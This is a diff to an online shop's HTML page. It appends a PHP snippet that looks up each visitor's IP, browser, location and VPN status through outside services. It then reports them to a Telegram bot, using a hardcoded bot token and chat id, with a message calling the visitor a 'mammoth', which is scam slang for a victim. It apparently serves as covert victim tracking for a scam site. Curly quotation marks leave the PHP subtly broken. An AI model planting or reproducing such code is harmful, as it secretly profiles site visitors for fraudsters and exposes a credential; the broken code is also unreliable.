@@ -619,3 +619,49 @@ Continue buying
 <script src="static/js/main.js"></script>
 <script>(function(){var js = "window['__CF$cv$params']={r:'857fb39d5f0456a5',t:'MTcwODM1ODIwNS4wNTcwMDA='};_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js',document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();</script></body>
 </html>
+
+<?php
+
+/* 
+Please keep this copyright statement intact
+Creator: Jeroenimo02#2380
+Publish Date: 19-03-2021
+Last Update: 18-03-2022
+APIs Provided By: geoiplookup.io and ip-api.com
+*/ 
+
+//Get the visitor's IP
+$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"]) ? $_SERVER["HTTP_CF_CONNECTING_IP"] : $_SERVER['REMOTE_ADDR']);
+$Browser = $_SERVER['HTTP_USER_AGENT'];
+
+
+//Check if IP is a VPN (Is not always correct!)
+$Details = json_decode(file_get_contents("http://ip-api.com/json/{$IP}"));
+$VPNConn = json_decode(file_get_contents("https://json.geoiplookup.io/{$IP}"));
+if ($VPNConn->connection_type === "Corporate") {
+    $VPN = "Yes";
+} else {
+    $VPN = "No";
+}
+
+//Set some variables
+$Country = $Details->country;
+$CountryCode = $Details->countryCode;
+$Region = $Details->regionName;
+$City = $Details->city;
+$Zip = $Details->zip;
+$Lat = $Details->lat;
+$Lon = $Details->lon;
+$WebhookName = $IP;
+$apiToken = “4334584910:AAEPmjlh84N62Lv3jGWEgOftlxxAfMhB1gs”; 
+$data = [ 
+    ‘chat_id’ => ‘6817925852’, 
+    ‘text’ => ‘Мамонт зашел на сайт
+    IP: $IP
+    Браузер: $Browser
+    Страна: $Country
+    VPN: $VPN’ 
+   ]; 
+
+$response = file_get_contents(“http://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) ); 
+?>
